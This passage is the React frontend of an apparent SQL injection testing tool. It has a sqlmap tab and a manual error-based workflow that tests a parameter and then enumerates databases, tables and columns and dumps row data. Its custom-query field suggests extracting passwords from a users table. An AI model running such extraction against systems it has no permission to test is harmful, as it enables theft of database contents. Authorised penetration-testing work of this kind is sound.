                  className="w-full flex items-center justify-center gap-2 px-3 py-2 rounded-lg text-xs font-mono border border-accent-primary text-accent-primary hover:bg-accent-primary hover:bg-opacity-10 transition-all">
                  📋 Import Raw HTTP Request
                </button>
                {showRawImport && (
                  <div className="mt-2 space-y-2">
                    <textarea value={rawRequest} onChange={e => setRawRequest(e.target.value)}
                      rows={10} className="input-field font-mono text-xs w-full resize-none"
                      placeholder={"POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"username\":\"admin\"}"} />
                    <div className="flex gap-2">
                      <button onClick={parseRawRequest} className="flex-1 py-1.5 btn-primary rounded font-mono text-xs font-bold">Parse & Import</button>
                      <button onClick={() => { setShowRawImport(false); setRawRequest('') }}
                        className="px-3 py-1.5 rounded border border-border-default text-text-muted font-mono text-xs">Cancel</button>
                    </div>
                  </div>
                )}
              </div>
              <div>
                <label className="label-field">Target URL *</label>
                <input value={config.url} onChange={e => setC('url', e.target.value)}
                  className="input-field font-mono text-sm" placeholder="https://api.target.com/contacts/search" />
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <label className="label-field">Method</label>
                  <select value={config.method} onChange={e => setC('method', e.target.value)} className="input-field text-sm">
                    {['GET','POST','PUT','PATCH','DELETE'].map(m => <option key={m}>{m}</option>)}
                  </select>
                </div>
                <div>
                  <label className="label-field">DBMS</label>
                  <select value={config.dbms} onChange={e => setC('dbms', e.target.value)} className="input-field text-sm">
                    <option value="mssql">MSSQL</option>
                    <option value="mysql">MySQL</option>
                    <option value="postgres">PostgreSQL</option>
                    <option value="oracle">Oracle</option>
                  </select>
                </div>
              </div>
              <p className="text-xs font-mono text-accent-primary font-semibold pt-2">STEP 2: Headers</p>
              <div>
                <label className="label-field">Bearer Token</label>
                <textarea value={config.bearer} onChange={e => setC('bearer', e.target.value)}
                  className="input-field h-16 resize-none font-mono text-xs"
                  placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." />
              </div>
              <div>
                <label className="label-field">Content-Type</label>
                <select value={config.contentType} onChange={e => setC('contentType', e.target.value)} className="input-field text-sm font-mono">
                  <option value="application/json">application/json</option>
                  <option value="application/x-www-form-urlencoded">application/x-www-form-urlencoded</option>
                  <option value="multipart/form-data">multipart/form-data</option>
                  <option value="text/plain">text/plain</option>
                </select>
              </div>
              <div>
                <label className="label-field">Cookie</label>
                <input value={config.cookieHeader} onChange={e => setC('cookieHeader', e.target.value)}
                  placeholder="session=abc123; token=xyz" className="input-field text-xs font-mono" />
              </div>
              <div>
                <label className="label-field">Extra Headers</label>
                <textarea value={config.extraHeaders} onChange={e => setC('extraHeaders', e.target.value)}
                  rows={2} placeholder={"X-Api-Key: secret\nX-Custom: value"}
                  className="input-field text-xs font-mono resize-none w-full" />
              </div>
              {config.contentType === 'application/x-www-form-urlencoded' ? (
                <div>
                  <label className="label-field">Form Body</label>
                  <textarea value={config.formBody} onChange={e => setC('formBody', e.target.value)}
                    className="input-field h-28 resize-none font-mono text-xs"
                    placeholder="csrf=token123&username=admin&password=test" />
                  {parseError && <p className="text-xs text-severity-critical mt-1 font-mono">{parseError}</p>}
                </div>
              ) : (
                <div>
                  <label className="label-field">JSON Body</label>
                  <textarea value={config.jsonBody} onChange={e => setC('jsonBody', e.target.value)}
                    className="input-field h-28 resize-none font-mono text-xs"
                    placeholder='{"keywords":"","pageNumber":1}' />
                  {parseError && <p className="text-xs text-severity-critical mt-1 font-mono">{parseError}</p>}
                </div>
              )}
              <button onClick={parseJSON} disabled={!config.url}
                className="btn-primary w-full flex items-center justify-center gap-2">
                <ChevronRight size={14} /> Parse & Continue
              </button>
            </>
          )}
          {step === 'test' && (
            <>
              <p className="text-xs font-mono text-accent-primary font-semibold">STEP 4: Select Vulnerable Parameter</p>
              <div className="space-y-1.5">
                {params.map(([path, val]) => (
                  <label key={path} className={`flex items-center gap-3 p-2.5 rounded-lg border cursor-pointer transition-all ${
                    config.vulnerableParam === path ? 'border-accent-primary bg-accent-primary bg-opacity-5' : 'border-border-default hover:border-border-muted'
                  }`}>
                    <input type="radio" name="param" value={path} checked={config.vulnerableParam === path}
                      onChange={() => setC('vulnerableParam', path)} className="accent-accent-primary" />
                    <div>
                      <p className="text-xs font-mono text-accent-primary">{path}</p>
                      <p className="text-xs text-text-muted">{String(val).slice(0,40)}</p>
                    </div>
                  </label>
                ))}
              </div>
              <p className="text-xs font-mono text-accent-primary font-semibold pt-2">Test Vulnerability</p>
              <button onClick={runTest} disabled={testing || !config.vulnerableParam}
                className="btn-primary w-full flex items-center justify-center gap-2">
                {testing ? <><Loader size={13} className="animate-spin" /> Testing...</> : <><Search size={13} /> Run Vulnerability Test</>}
              </button>
              {testResults.length > 0 && (
                <div className="space-y-2">
                  {testResults.map((r, i) => (
                    <div key={i} className={`p-3 rounded-lg border text-xs font-mono ${r.is_vulnerable ? 'border-severity-low bg-severity-low bg-opacity-5' : 'border-border-default'}`}>
                      <div className="flex items-center gap-2 mb-1">
                        {r.is_vulnerable ? <CheckCircle size={11} className="text-severity-low" /> : <X size={11} className="text-text-muted" />}
                        <span className={r.is_vulnerable ? 'text-severity-low' : 'text-text-muted'}>{r.name}</span>
                        {r.elapsed && <span className="text-text-muted ml-auto">{r.elapsed}s</span>}
                      </div>
                      {r.extracted && <p className="text-accent-primary">→ {r.extracted}</p>}
                      {r.raw_message && <p className="text-text-muted truncate">{r.raw_message.slice(0,80)}</p>}
                    </div>
                  ))}
                  {testResults.some(r => r.is_vulnerable) && (
                    <button onClick={() => setStep('extract')} className="btn-primary w-full text-sm">→ Lanjut Extraction</button>
                  )}
                </div>
              )}
            </>
          )}
          {step === 'extract' && (
            <>
              <div className="flex items-center justify-between">
                <p className="text-xs font-mono text-accent-primary font-semibold">Extraction Operations</p>
                <button onClick={exportResults} className="flex items-center gap-1 text-xs font-mono text-text-muted hover:text-text-primary">
                  <Download size={11} /> Export JSON
                </button>
              </div>
              <div className="grid grid-cols-2 gap-2">
                {[{key:'db_name',label:'DB Name'},{key:'user',label:'Current User'},{key:'version',label:'Version'},{key:'servername',label:'Server Name'}].map(({key,label}) => (
                  <button key={key} onClick={() => runExtract(key)} disabled={extracting}
                    className={`p-2.5 rounded-lg border text-xs font-mono text-left transition-all hover:border-accent-primary ${extractResults[key] ? 'border-severity-low bg-severity-low bg-opacity-5' : 'border-border-default'}`}>
                    <p className="text-text-muted">{label}</p>
                    <p className="text-accent-primary font-bold truncate mt-0.5">{extractResults[key] ? String(extractResults[key]) : '—'}</p>
                  </button>
                ))}
              </div>
              <div className="space-y-2 pt-2 border-t border-border-default">
                <p className="text-xs font-mono text-text-muted uppercase">Enumerate</p>
                <button onClick={() => runExtract('dbs')} disabled={extracting} className="btn-secondary w-full text-xs flex items-center gap-2">
                  <Database size={12} /> Enumerate Databases
                </button>
                {extractResults['dbs'] && (
                  <div>
                    <label className="label-field">Select Database</label>
                    <select value={extractParams.db} onChange={e => setExtractParams(p => ({...p, db: e.target.value}))} className="input-field text-sm">
                      <option value="">— pilih database —</option>
                      {(extractResults['dbs'] as string[]).map(d => <option key={d} value={d}>{d}</option>)}
                    </select>
                  </div>
                )}
                {extractParams.db && (
                  <button onClick={() => runExtract('tables')} disabled={extracting} className="btn-secondary w-full text-xs flex items-center gap-2">
                    <ChevronRight size={12} /> Enumerate Tables ({extractParams.db})
                  </button>
                )}
                {extractResults['tables'] && (
                  <div>
                    <label className="label-field">Select Table</label>
                    <select value={extractParams.table} onChange={e => setExtractParams(p => ({...p, table: e.target.value}))} className="input-field text-sm">
                      <option value="">— pilih table —</option>
                      {(extractResults['tables'] as string[]).map(t => <option key={t} value={t}>{t}</option>)}
                    </select>
                  </div>
                )}
                {extractParams.table && (
                  <button onClick={() => runExtract('columns')} disabled={extracting} className="btn-secondary w-full text-xs flex items-center gap-2">
                    <ChevronRight size={12} /> Enumerate Columns ({extractParams.table})
                  </button>
                )}
                {extractResults['columns'] && (
                  <div>
                    <label className="label-field">Select Column</label>
                    <select value={extractParams.col} onChange={e => setExtractParams(p => ({...p, col: e.target.value}))} className="input-field text-sm">
                      <option value="">— pilih column —</option>
                      {(extractResults['columns'] as string[]).map(c => <option key={c} value={c}>{c}</option>)}
                    </select>
                  </div>
                )}
                {extractParams.col && (
                  <>
                    <div>
                      <label className="label-field">Limit rows</label>
                      <input type="number" value={extractParams.limit}
                        onChange={e => setExtractParams(p => ({...p, limit: +e.target.value}))}
                        className="input-field text-sm" min={1} max={100} />
                    </div>
                    <button onClick={() => runExtract('dump')} disabled={extracting}
                      className="btn-primary w-full text-xs flex items-center justify-center gap-2">
                      {extracting ? <Loader size={12} className="animate-spin" /> : <Download size={12} />}
                      Dump {extractParams.col}
                    </button>
                  </>
                )}
              </div>
              <div className="pt-2 border-t border-border-default space-y-2">
                <p className="text-xs font-mono text-text-muted uppercase">Custom Query</p>
                <textarea id="customQuery" className="input-field h-16 resize-none font-mono text-xs"
                  placeholder="SELECT TOP 1 password FROM users" />
                <button onClick={() => {
                  const q = (document.getElementById('customQuery') as HTMLTextAreaElement).value
                  if (!q) return
                  api.post('/sqli/manual/extract', {
                    url: config.url, method: config.method, headers: buildHeaders(),
                    json_body: config.contentType === 'application/json' ? parsed : null,
                    form_body: buildFormBody(),
                    vulnerable_param: config.vulnerableParam, dbms: config.dbms, action: 'custom', custom_query: q,
                  }).then(r => { addLog(`Custom: ${r.data.result || r.data.items?.join(', ') || 'No result'}`) })
                  .catch(e => addLog(`Error: ${e.message}`))
                }} className="btn-secondary w-full text-xs">Run Custom Query</button>
              </div>
            </>
          )}
        </div>
      </div>
      <div className="flex-1 card overflow-hidden flex flex-col">
        <div className="flex items-center justify-between p-3 border-b border-border-default flex-shrink-0">
          <span className="text-xs font-mono text-accent-primary flex items-center gap-2"><Terminal size={13} /> Extraction Log</span>
          <div className="flex items-center gap-3">
            {extracting && <Loader size={13} className="text-accent-primary animate-spin" />}
            <button onClick={() => setExtractLog([])} className="text-xs font-mono text-text-muted hover:text-text-primary">Clear</button>
            <button onClick={() => navigator.clipboard.writeText(extractLog.join('\n'))}
              className="text-xs font-mono text-text-muted hover:text-text-primary flex items-center gap-1"><Copy size={11} /> Copy</button>
          </div>
        </div>
        <div className="flex-1 overflow-y-auto p-4 font-mono text-xs" style={{ background: '#0a0a0f' }}>
          {extractLog.length === 0 ? (
            <div className="flex items-center justify-center h-full">
              <div className="text-center">
                <Terminal size={32} className="text-text-muted mx-auto mb-2" />
                <p className="text-text-muted">Hasil extraction akan muncul di sini</p>
                <p className="text-text-muted text-xs mt-1">Configure → Test → Extract</p>
              </div>
            </div>
          ) : extractLog.map((line, i) => (
            <div key={i} className={`leading-5 ${line.includes('✓') ? 'text-green-400' : line.includes('✗') ? 'text-red-400' : line.startsWith('  ') ? 'text-cyan-400 pl-4' : 'text-gray-400'}`}>{line}</div>
          ))}
        </div>
        {Object.keys(extractResults).length > 0 && (
          <div className="border-t border-border-default p-3 bg-bg-tertiary">
            <p className="text-xs font-mono text-text-muted mb-2 uppercase">Extracted Data</p>
            <div className="flex flex-wrap gap-2">
              {Object.entries(extractResults).map(([k, v]) => (
                <div key={k} className="bg-bg-secondary border border-border-default rounded px-2 py-1 text-xs font-mono">
                  <span className="text-text-muted">{k}: </span>
                  <span className="text-accent-primary">{Array.isArray(v) ? `[${v.length} items]` : String(v).slice(0,40)}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

// ── Main Page ─────────────────────────────────────────────────
export default function SQLiPage() {
  const [activeTab, setActiveTab] = useState<'sqlmap'|'manual'>('manual')
  return (
    <div className="flex flex-col space-y-4 animate-fade-in" style={{ height: 'calc(100vh - 100px)' }}>
      <div className="flex items-center justify-between flex-shrink-0">
        <div>
          <h1 className="text-2xl font-display font-bold text-text-primary flex items-center gap-3">
            <Database size={24} className="text-accent-primary" /> SQLi Module
          </h1>
          <p className="text-text-muted text-sm font-mono mt-1">SQL Injection Testing — sqlmap & Manual Error-Based</p>
        </div>
        <div className="flex items-center gap-1 border border-border-default rounded-lg p-1">
          <button onClick={() => setActiveTab('sqlmap')}
            className={`px-4 py-2 text-xs font-mono rounded transition-all ${activeTab === 'sqlmap' ? 'bg-bg-hover text-accent-primary' : 'text-text-muted hover:text-text-secondary'}`}>
            sqlmap
          </button>
          <button onClick={() => setActiveTab('manual')}
            className={`px-4 py-2 text-xs font-mono rounded transition-all ${activeTab === 'manual' ? 'bg-bg-hover text-accent-primary' : 'text-text-muted hover:text-text-secondary'}`}>
            Manual (Error-Based)
          </button>
        </div>
      </div>
      <div className="flex-1 min-h-0">
        {activeTab === 'sqlmap' ? <SqlmapPanel /> : <ManualSQLiPanel />}
      </div>
    </div>
  )
}
 
 
